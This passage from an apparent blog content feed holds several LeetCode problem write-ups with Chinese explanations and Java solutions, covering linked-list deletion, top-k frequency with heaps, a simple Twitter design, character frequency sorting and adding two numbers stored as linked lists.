<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将后续节点的值复制到前一个上，然后在最后一个节点之前截断</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != node.next) &#123;</span><br><span class="line">            node.val = node.next.val;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> == node.next.next) &#123;</span><br><span class="line">                node.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>将后一个节点的值拷贝至前一个节点，然后直接越过后一个节点，链接到后后一个节点。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        node.val = node.next.val;</span><br><span class="line">        node.next = node.next.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>347. Top K Frequent Elements</title>
    <url>/2020/03/25/LeetCode/leetcode-000347-Top%20K%20Frequent%20Elements/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a non-empty array of integers, return the <strong><em>k\</em></strong> most frequent elements.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,1,1,2,2,3], k &#x3D; 2</span><br><span class="line">Output: [1,2]</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>], k = <span class="number">1</span></span><br><span class="line">Output: [<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume <em>k</em> is always valid, 1 ≤ <em>k</em> ≤ number of unique elements.</li>
<li>Your algorithm’s time complexity <strong>must be</strong> better than O(<em>n</em> log <em>n</em>), where <em>n</em> is the array’s size.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个大顶堆，取K个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.value = value;</span><br><span class="line">			<span class="keyword">this</span>.count = count;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> value;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.value = value;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> count;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCount</span><span class="params">(<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.count = count;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">topKFrequent</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; values = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			<span class="keyword">if</span> (values.containsKey(num)) &#123;</span><br><span class="line">				values.put(num, values.get(num) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				values.put(num, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		PriorityQueue&lt;Node&gt; nodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;(values.size(), (a, b) -&gt; b.getCount() - a.getCount());</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : values.entrySet()) &#123;</span><br><span class="line">			Node node = <span class="keyword">new</span> Node(entry.getKey(), entry.getValue());</span><br><span class="line">			nodes.add(node);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(k);</span><br><span class="line">		<span class="keyword">while</span> (k &gt; <span class="number">0</span> &amp;&amp; !nodes.isEmpty()) &#123;</span><br><span class="line">			result.add(nodes.poll().getValue());</span><br><span class="line">			k--;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>355. Design Twitter</title>
    <url>/2020/03/25/LeetCode/leetcode-000355.%20Design%20Twitter/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design a simplified version of Twitter where users can post tweets, follow/unfollow another user and is able to see the 10 most recent tweets in the user’s news feed. Your design should support the following methods:</p>
<ol>
<li><strong>postTweet(userId, tweetId)</strong>: Compose a new tweet.</li>
<li><strong>getNewsFeed(userId)</strong>: Retrieve the 10 most recent tweet ids in the user’s news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent.</li>
<li><strong>follow(followerId, followeeId)</strong>: Follower follows a followee.</li>
<li><strong>unfollow(followerId, followeeId)</strong>: Follower unfollows a followee.</li>
</ol>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Twitter twitter &#x3D; new Twitter();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 posts a new tweet (id &#x3D; 5).</span><br><span class="line">twitter.postTweet(1, 5);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5].</span><br><span class="line">twitter.getNewsFeed(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 follows user 2.</span><br><span class="line">twitter.follow(1, 2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 2 posts a new tweet (id &#x3D; 6).</span><br><span class="line">twitter.postTweet(2, 6);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 2 tweet ids -&gt; [6, 5].</span><br><span class="line">&#x2F;&#x2F; Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.</span><br><span class="line">twitter.getNewsFeed(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 unfollows user 2.</span><br><span class="line">twitter.unfollow(1, 2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5],</span><br><span class="line">&#x2F;&#x2F; since user 1 is no longer following user 2.</span><br><span class="line">twitter.getNewsFeed(1);</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用一个哈希表保存用户follow的用户；使用一个哈希表保存用户自己发送的tweet</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twitter</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> tweetIndex = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> Map&lt;Integer, Set&lt;Integer&gt;&gt; userFollowers;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> Map&lt;Integer, PriorityQueue&lt;Tweet&gt;&gt; userTweets;</span><br><span class="line">		</span><br><span class="line">	    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="title">Twitter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	        userFollowers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	        userTweets = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Compose a new tweet. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postTweet</span><span class="params">(<span class="keyword">int</span> userId, <span class="keyword">int</span> tweetId)</span> </span>&#123;</span><br><span class="line">	    	Tweet tweet = <span class="keyword">new</span> Tweet(userId, tweetId, tweetIndex++);</span><br><span class="line">	        <span class="keyword">if</span> (userTweets.containsKey(userId)) &#123;</span><br><span class="line">	        	PriorityQueue&lt;Tweet&gt; queue = userTweets.get(userId);</span><br><span class="line">	        	queue.add(tweet);</span><br><span class="line">	        	<span class="keyword">if</span> (queue.size() &gt; <span class="number">10</span>) &#123;</span><br><span class="line">	        		queue.poll();</span><br><span class="line">	        	&#125;</span><br><span class="line">	        	userTweets.put(userId, queue);</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        	PriorityQueue&lt;Tweet&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;((t1, t2) -&gt; t1.getCurrentTime() - t2.getCurrentTime());</span><br><span class="line">	        	queue.add(tweet);</span><br><span class="line">	        	userTweets.put(userId, queue);</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Retrieve the 10 most recent tweet ids in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getNewsFeed</span><span class="params">(<span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line">	    	PriorityQueue&lt;Tweet&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;((t1, t2) -&gt; t2.getCurrentTime() - t1.getCurrentTime());</span><br><span class="line">	    	<span class="keyword">if</span> (userTweets.containsKey(userId)) &#123;</span><br><span class="line">	    		queue.addAll(userTweets.get(userId));</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	</span><br><span class="line">	    	<span class="keyword">if</span> (userFollowers.containsKey(userId)) &#123;</span><br><span class="line">	    		Set&lt;Integer&gt; followers = userFollowers.get(userId);</span><br><span class="line">	    		</span><br><span class="line">	    		<span class="keyword">for</span> (<span class="keyword">int</span> follower : followers) &#123;</span><br><span class="line">	    			<span class="keyword">if</span> (userTweets.containsKey(follower)) &#123;</span><br><span class="line">	    				queue.addAll(userTweets.get(follower));</span><br><span class="line">	    			&#125;</span><br><span class="line">	    		&#125;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	</span><br><span class="line">	    	List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(<span class="number">10</span>);</span><br><span class="line">	    	<span class="keyword">if</span> (!queue.isEmpty()) &#123;</span><br><span class="line">    			<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    			<span class="keyword">while</span> (index &lt; <span class="number">10</span> &amp;&amp; !queue.isEmpty() ) &#123;</span><br><span class="line">    				result.add(queue.poll().getTweetId());</span><br><span class="line">    				index++;</span><br><span class="line">    			&#125;</span><br><span class="line">    			<span class="keyword">return</span> result;</span><br><span class="line">    		&#125;</span><br><span class="line">	        <span class="keyword">return</span> result;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Follower follows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">follow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (followerId == followeeId) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">	    	<span class="keyword">if</span> (userFollowers.containsKey(followerId)) &#123;</span><br><span class="line">	    		userFollowers.get(followerId).add(followeeId);</span><br><span class="line">	    	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    		Set&lt;Integer&gt; followees = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">	    		followees.add(followeeId);</span><br><span class="line">	    		userFollowers.put(followerId, followees);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Follower unfollows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unfollow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>&#123;</span><br><span class="line">	        <span class="keyword">if</span> (userFollowers.containsKey(followerId)) &#123;</span><br><span class="line">	        	userFollowers.get(followerId).remove(followeeId);</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>451. Sort Characters By Frequency</title>
    <url>/2020/03/25/LeetCode/leetcode-000451-Sort%20Characters%20By%20Frequency/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string, sort it in decreasing order based on the frequency of characters.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">&quot;tree&quot;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&quot;eert&quot;</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">&#39;e&#39; appears twice while &#39;r&#39; and &#39;t&#39; both appear once.</span><br><span class="line">So &#39;e&#39; must appear before both &#39;r&#39; and &#39;t&#39;. Therefore &quot;eetr&quot; is also a valid answer.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line"><span class="string">"cccaaa"</span></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="string">"cccaaa"</span></span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">Both <span class="string">'c'</span> and <span class="string">'a'</span> appear three times, so <span class="string">"aaaccc"</span> is also a valid answer.</span><br><span class="line">Note that <span class="string">"cacaca"</span> is incorrect, as the same characters must be together.</span><br></pre></td></tr></table></figure>

<h2 id="Example-3："><a href="#Example-3：" class="headerlink" title="Example 3："></a>Example 3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line"><span class="string">"Aabb"</span></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="string">"bbAa"</span></span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line"><span class="string">"bbaA"</span> is also a valid answer, but <span class="string">"Aabb"</span> is incorrect.</span><br><span class="line">Note that <span class="string">'A'</span> and <span class="string">'a'</span> are treated as two different characters.</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume <em>k</em> is always valid, 1 ≤ <em>k</em> ≤ number of unique elements.</li>
<li>Your algorithm’s time complexity <strong>must be</strong> better than O(<em>n</em> log <em>n</em>), where <em>n</em> is the array’s size.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个大顶堆，遍历取完即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> times;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTimes</span><span class="params">(<span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> String <span class="title">frequencySort</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">int</span>[] chars = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			 chars[c]++;</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 PriorityQueue&lt;Node&gt; charNodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a, b) -&gt; b.getTimes() - a.getTimes());</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>;i++) &#123;</span><br><span class="line">			 <span class="keyword">if</span> (chars[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				 <span class="keyword">continue</span>;</span><br><span class="line">			 &#125;</span><br><span class="line">			 </span><br><span class="line">			 Node node = <span class="keyword">new</span> Node((<span class="keyword">char</span>) i, chars[i]);</span><br><span class="line">			 charNodes.add(node);</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		 <span class="keyword">while</span> (!charNodes.isEmpty()) &#123;</span><br><span class="line">			 Node node = charNodes.poll();</span><br><span class="line">			 <span class="keyword">int</span> total = node.getTimes();</span><br><span class="line">			 <span class="keyword">while</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				 sb.append(node.getC());</span><br><span class="line">				 total--;</span><br><span class="line">			 &#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> sb.toString();</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>707. Design Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000445-Add%20Two%20Numbers%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
<li><p>You are given two <strong>non-empty</strong> linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p>
<p>  You may assume the two numbers do not contain any leading zero, except the number 0 itself.</p>
</li>
</ul>
<h2 id="Follow-up"><a href="#Follow-up" class="headerlink" title="Follow up:"></a>Follow up:</h2><p>What if you cannot modify the input lists? In other words, reversing the lists is not allowed.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>翻转两个链表，大数加法，得到结果之后，再翻转回来</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> reverse(<span class="keyword">null</span>, head);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode next, ListNode current)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == current) &#123;</span><br><span class="line">			<span class="keyword">return</span> next;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ListNode nextNode = current.next;</span><br><span class="line">		current.next = next;</span><br><span class="line">		<span class="keyword">return</span> reverse(current, nextNode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode rev1 = reverse(l1);</span><br><span class="line">		ListNode rev2 = reverse(l2);</span><br><span class="line">		ListNode res = <span class="keyword">new</span> ListNode(rev1.val + rev2.val);</span><br><span class="line">		ListNode curr = res;</span><br><span class="line">		<span class="keyword">while</span> (rev1.next != <span class="keyword">null</span> || rev2.next != <span class="keyword">null</span> || curr.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (curr.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">				curr.val -= <span class="number">10</span>;</span><br><span class="line">				curr.next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				curr.next = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			curr = curr.next;</span><br><span class="line">			<span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (rev1.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">				rev1 = rev1.next;</span><br><span class="line">				val += rev1.val;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (rev2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">				rev2 = rev2.next;</span><br><span class="line">				val += rev2.val;</span><br><span class="line">			&#125;</span><br><span class="line">			curr.val += val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> reverse(res);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二：Follow-up"><a href="#解法二：Follow-up" class="headerlink" title="解法二：Follow up"></a>解法二：Follow up</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ListNode result = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="keyword">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">help</span><span class="params">(ListNode big, ListNode small, <span class="keyword">int</span> sizeB, <span class="keyword">int</span> sizeS)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(big == <span class="keyword">null</span> &amp;&amp; small == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(sizeB == sizeS) &#123;</span><br><span class="line">            sum = big.val + small.val + help(big.next, small.next, --sizeB, --sizeS);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum = big.val +  help(big.next, small, --sizeB, sizeS);</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode temp = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">        temp.next = result;</span><br><span class="line">        result = temp;</span><br><span class="line">        <span class="keyword">return</span> sum / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = size(l1);</span><br><span class="line">        <span class="keyword">int</span> right = size(l2);</span><br><span class="line">        ListNode big = left &gt; right ? l1 : l2;</span><br><span class="line">        ListNode small = left &gt; right ? l2 : l1;</span><br><span class="line">        <span class="keyword">int</span> sizeB = left &gt; right ? left : right;</span><br><span class="line">        <span class="keyword">int</span> sizeS = left &gt; right ? right : left;        </span><br><span class="line">        <span class="keyword">int</span> carry = help(big, small, sizeB, sizeS);</span><br><span class="line">        <span class="keyword">if</span>(carry != <span class="number">0</span>) &#123;</span><br><span class="line">            ListNode temp = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">            temp.next = result;</span><br><span class="line">            result = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>703. Kth Largest Element in a Stream</title>
    <url>/2020/03/25/LeetCode/leetcode-000703.%20Kth%20Largest%20Element%20in%20a%20Stream/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design a class to find the <strong>k</strong>th largest element in a stream. Note that it is the kth largest element in the sorted order, not the kth distinct element.</p>
<p>Your <code>KthLargest</code> class will have a constructor which accepts an integer <code>k</code> and an integer array <code>nums</code>, which contains initial elements from the stream. For each call to the method <code>KthLargest.add</code>, return the element representing the kth largest element in the stream.</p>
